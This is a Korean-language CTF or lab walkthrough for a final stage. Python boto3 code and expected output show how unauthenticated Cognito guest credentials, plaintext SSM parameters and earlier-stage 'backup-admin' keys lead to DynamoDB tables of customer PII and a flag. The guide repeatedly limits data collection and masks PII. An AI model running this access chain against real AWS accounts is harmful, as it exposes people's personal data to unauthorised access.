# Stage 4 최종: PII 확인 및 최종 Flag 획득

**공식 참고**: stage1-to-aws-pii-hands-on-guide-ko.html (Section PII-01 ~ PII-05)

---

## 개요: PII 테이블 3개와 최소 수집 원칙

```
목표:
1. Cognito 게스트 자격으로 secuwave-customers 20건 샘플
2. SSM Parameter에서 실제 테이블명 확인
3. DynamoDB secuwave-members 테이블 스캔
   → ID 리스트 1001개 확인
   → 최종 flag item 조회
```

---

## PII-01: Cognito 게스트 인증 → secuwave-customers

### 목표
Cognito Identity Pool 비인증 자격으로 customers 테이블에 20건만 접근

### 3단계 프로세스

**Step 1: Cognito GetId (비인증)**

```python
import boto3
import json

cognito = boto3.client('cognito-identity', region_name='ap-northeast-2')

# Identity Pool ID는 S3 bucket secuwave-backup-artifacts에서 획득
# 예: ap-northeast-2:befd020a-6c68-45ac-91e2-9aea9139d857

response = cognito.get_id(
    IdentityPoolId='ap-northeast-2:befd020a-6c68-45ac-91e2-9aea9139d857'
)

identity_id = response['IdentityId']
print(f"[+] Identity ID: {identity_id}")
```

**Step 2: GetCredentialsForIdentity**

```python
response = cognito.get_credentials_for_identity(
    IdentityId=identity_id
)

guest_creds = response['Credentials']
print(f"[+] Access Key: {guest_creds['AccessKeyId'][:20]}...")
print(f"[+] Secret Key: [PRIVATE]")
print(f"[+] Session Token: {guest_creds['SessionToken'][:20]}...")
```

**Step 3: DynamoDB Scan with Limit=20**

```python
# Cognito 게스트 자격증명으로 세션 생성
session = boto3.Session(
    aws_access_key_id=guest_creds['AccessKeyId'],
    aws_secret_access_key=guest_creds['SecretAccessKey'],
    aws_session_token=guest_creds['SessionToken'],
    region_name='ap-northeast-2'
)

dynamodb = session.resource('dynamodb')
table = dynamodb.Table('secuwave-customers')

response = table.scan(Limit=20)

print(f"[+] Items returned: {response['Count']}")
print(f"[+] LastEvaluatedKey: {response.get('LastEvaluatedKey')}")

# PII 필드 확인 (샘플만)
for item in response['Items'][:3]:
    print(f"\nSample Item:")
    print(f"  - id: {item.get('id')}")
    print(f"  - name: [PRIVATE]")
    print(f"  - email: [PRIVATE]")
    print(f"  - phone: [PRIVATE]")
    print(f"  - address: [PRIVATE]")
    print(f"  - registration_date: {item.get('registration_date')}")
    print(f"  - password_hash: [PRIVATE]")
```

### 예상 응답

```
[+] Items returned: 20
[+] LastEvaluatedKey: exists
[+] PII Fields Found:
    ✓ name (식별)
    ✓ email (연락처)
    ✓ phone (연락처)
    ✓ address (위치)
    ✓ registration_date (활동)
    ✓ password_hash (인증)
```

### 증적 기록

```bash
# 공개 가능:
- HTTP Status: 200
- Items Count: 20
- LastEvaluatedKey: 존재
- 필드명: name, email, phone, address, registration_date, password_hash
- Request ID: KFEVN1D82ML64Q3GI700GOO0SNVV4KQNSO5AEMVJF66Q9ASUAAJG
- Response SHA-256: 7db35fec7c1fd37869567f01f3f5b8f7998cbaeb43356186a476adf7e76e6ebd

# Private 처리:
- 실제 name/email/phone/address 값
- password_hash 원문
- 모든 개인정보 원문
```

---

## PII-02: SSM Parameter로 실제 테이블 찾기

### 목표
SSM Parameter Store에서 정확한 DynamoDB 테이블명 확인

### 2개 Parameter 읽기

**Parameter 1: /prod/dynamodb/access-note**

```python
# backup-admin 자격증명 사용 (Stage 3에서 획득)
ssm = session.client('ssm', region_name='ap-northeast-2')

response = ssm.get_parameter(
    Name='/prod/dynamodb/access-note'
)

note = response['Parameter']['Value']
print(f"[+] Access Note:")
print(f"    {note}")
# 예상: "회원 데이터 테이블 - secu-wave-conf 직접 접근"
```

**Parameter 2: /prod/dynamodb/table-name**

```python
response = ssm.get_parameter(
    Name='/prod/dynamodb/table-name'
)

table_name = response['Parameter']['Value']
print(f"[+] Table Name: {table_name}")
# 예상: "secuwave-members"
```

### 중요 포인트

- ✓ SSM 방식: **평문 저장** (암호화 없음)
- ✓ 접근 권한: backup-admin user만 가능
- ✗ 추측하지 않음: employees, customers 등 여러 테이블 존재 가능
- ✓ 정확히 SSM 값 사용: secuwave-members

---

## PII-03: DynamoDB members 테이블 스키마 확인

### 목표
members 테이블의 구조와 아이템 개수 확인

### DescribeTable

```python
dynamodb = session.resource('dynamodb', region_name='ap-northeast-2')
table = dynamodb.Table('secuwave-members')

response = table.meta.client.describe_table(
    TableName='secuwave-members'
)

print(f"[+] Table Status: {response['Table']['TableStatus']}")
print(f"[+] Item Count: {response['Table']['ItemCount']}")
print(f"[+] Key Schema:")
for key in response['Table']['KeySchema']:
    print(f"    - {key['AttributeName']} ({key['KeyType']})")

print(f"[+] Attributes:")
for attr in response['Table']['AttributeDefinitions']:
    print(f"    - {attr['AttributeName']} ({attr['AttributeType']})")
```

### 예상 결과

```
[+] Table Status: ACTIVE
[+] Item Count: 1001
[+] Key Schema:
    - id (HASH)
[+] Attributes:
    - id (String)
    - name (String)
    - email (String)
    - phone (String)
    - address (String)
    - registration_date (String)
    - last_login (String)
    - password_hash (String)
```

### 샘플 20건 스캔

```python
response = table.scan(Limit=20)

print(f"[+] Sample Records:")
for i, item in enumerate(response['Items'][:5], 1):
    print(f"\n  Record {i}:")
    print(f"    id: {item['id']}")
    print(f"    name: [PII]")
    print(f"    email: [PII]")
    print(f"    phone: [PII]")
    print(f"    address: [PII]")
```

### 증적 기록

```
- DescribeTable Request ID: MRDB53PSP1ISUJCJ3E282E4A67VV4KQNSO5AEMVJF66Q9ASUAAJG
- DescribeTable SHA-256: 0d55f107e194af195751670d63a93518d7d2f3817787ba70052028fc2d237150
- Sample Scan Request ID: 3OVVNEP5K19BQH53QD5U3M0CGRVV4KQNSO5AEMVJF66Q9ASUAAJG
- Sample Scan SHA-256: 74f7e1449f562183b1abc71051cd7bf1dc6cca14ad8557f66fe477415b6a0970
- Item Count: 1001 ✓
- Status: ACTIVE ✓
```

---

## PII-04: 전체 ID만 프로젝션으로 스캔

### 목표
1,001개 전체 id를 조회하되, **id 필드만** 추출 (개인정보 제외)

### ProjectionExpression 사용

```python
all_ids = []
last_key = None

while True:
    params = {
        'TableName': 'secuwave-members',
        'ProjectionExpression': 'id',  # id만 추출
        'Limit': 1000
    }
    
    if last_key:
        params['ExclusiveStartKey'] = last_key
    
    response = dynamodb.meta.client.scan(**params)
    
    for item in response.get('Items', []):
        all_ids.append(item['id']['S'])  # DynamoDB API는 {S: value} 형식
    
    # 다음 페이지 확인
    if 'LastEvaluatedKey' not in response:
        break
    
    last_key = response['LastEvaluatedKey']
    time.sleep(1)  # API 레이트 제한

print(f"[+] Total IDs: {len(all_ids)}")
print(f"[+] ID Examples:")
for id_val in all_ids[:5]:
    print(f"    - {id_val}")

# 특수 ID 찾기
special_ids = [id_val for id_val in all_ids if not id_val.startswith('U')]
print(f"[+] Special IDs (non-UDDDD):")
for id_val in special_ids:
    print(f"    - {id_val}")  # 예: SSM-FLAG
```

### 예상 결과

```
[+] Total IDs: 1001
[+] ID Examples:
    - U0000
    - U0001
    - U0002
    - U0003
    - U0004
[+] Special IDs (non-UDDDD):
    - SSM-FLAG
```

### 증적 기록

```
- Total Count: 1001 ✓
- LastEvaluatedKey: None (단일 페이지) ✓
- Request ID: I1S05SU1MFSUK031MD09QBCOERVV4KQNSO5AEMVJF66Q9ASUAAJG
- Response SHA-256: b0058da1b7252f4cbab06f11372d92ea50a8744aca927c88b6eb8d7b56fb0a85
- Special ID Found: SSM-FLAG ✓
```

---

## PII-05: 최종 Flag 조회 (GetItem)

### 목표
id=SSM-FLAG 아이템을 정확히 1회 조회하여 flag 획득

### GetItem 요청

```python
# 정확히 1회만 호출
response = dynamodb.meta.client.get_item(
    TableName='secuwave-members',
    Key={
        'id': {'S': 'SSM-FLAG'}
    }
)

item = response.get('Item', {})

if 'flag' in item:
    flag = item['flag']['S']
    print(f"\n[✓] FLAG FOUND!")
    print(f"    {flag}")
else:
    print(f"[-] Flag field not found in item")
```

### 예상 결과

```
[✓] FLAG FOUND!
    FLAG{ssm_plaintext_to_pii_exfiltration}
```

### 의미 분석

```
FLAG{ssm_plaintext_to_pii_exfiltration}

ssm_plaintext:
  - AWS Systems Manager Parameter Store에 평문 저장
  - 암호화 없음 (KMS 사용 안함)
  - backup-admin 사용자 누구나 접근 가능

to_pii_exfiltration:
  - SSM의 평문 저장 → 자격증명 노출
  - 자격증명 노출 → AWS 역할 체인 가능
  - AWS 역할 체인 → DynamoDB 무제한 접근
  - DynamoDB 접근 → 1001명 개인정보 유출
  - 결과: PII 데이터 완전 유출
```

### 증적 기록

```
✓ GetItem Status: 200 (Success)
✓ Item Exists: Yes
✓ Response SHA-256: ac014e4100fefc7bd0f961bc853286fc57d424a56bda6f2e48c3dc0fd80f1080
✓ Flag Confirmed: FLAG{ssm_plaintext_to_pii_exfiltration}
```

---

## 최종 체크리스트

```
☑ PII-01: Cognito 게스트 → customers 20건 ✓
☑ PII-02: SSM 파라미터 → 테이블명 확인 ✓
☑ PII-03: DynamoDB members DescribeTable ✓
☑ PII-04: 전체 ID 1001개 스캔 (id만) ✓
☑ PII-05: GetItem id=SSM-FLAG ✓

FLAG{ssm_plaintext_to_pii_exfiltration}
```

---

## ⚠️ 중요 제약사항

### 수집 최소화 원칙

```
❌ 전체 테이블 스캔 (모든 필드)
❌ 1000개 이상 개인정보 기록
❌ 이메일/전화/주소 원문 복사
❌ password_hash 원문 공유

✓ 필드명만 기록
✓ 샘플 20건 필드 확인
✓ 전체 ID 조회 (id 필드만)
✓ Flag 최종 확인
```

### AWS API 호출 제약

```
❌ ListBuckets (모든 버킷 열거)
❌ Scan Limit > 1000 (다중 페이지 요청)
❌ Projection 없이 전체 필드 수집
❌ 동일 key에 대한 다중 GetItem

✓ 정확한 버킷명 3개만 사용
✓ Scan은 최대 1000 Limit
✓ ProjectionExpression으로 필드 제한
✓ SSM/Flag는 각 1회만 호출
```

### 회원 데이터 보호

```
❌ 이름 원문 기록
❌ 이메일 전체 복사
❌ 전화번호 저장
❌ 주소 상세 정보
❌ password_hash 원문 출력

✓ 필드명만 기록
✓ 필드 존재 여부만
✓ 레코드 개수만
✓ SHA-256 해시
✓ Request ID
```

---

## 성공 신호

```
최종 체크포인트:
1. ✓ Cognito 게스트 자격증명 획득
2. ✓ customers 테이블 20건 샘플 확인
3. ✓ SSM /prod/dynamodb/table-name = secuwave-members
4. ✓ members 테이블 1001 items
5. ✓ Special ID "SSM-FLAG" 발견
6. ✓ GetItem(id=SSM-FLAG) 성공
7. ✓ FLAG 획득

FLAG{ssm_plaintext_to_pii_exfiltration}

다음: 증적 정리 및 제출
```

---

## 참고: 공식 제출 양식

```
제출 사항:
1. 비식별 증적 매트릭스 (모든 private 값 제외)
2. Request ID 3개 (Cognito, SSM, DynamoDB)
3. Response SHA-256 (민감 정보 제외)
4. 최종 Flag (평문)

제출 형식:
- 파일명: 제출용_개인정보_테이블_확인서_20260820.docx
- 내용: 필드명, 개수, Hash, Request ID만
- PII 원문 절대 포함 금지
```

---

**완료!** Stage 4 최종 Flag 획득 완료

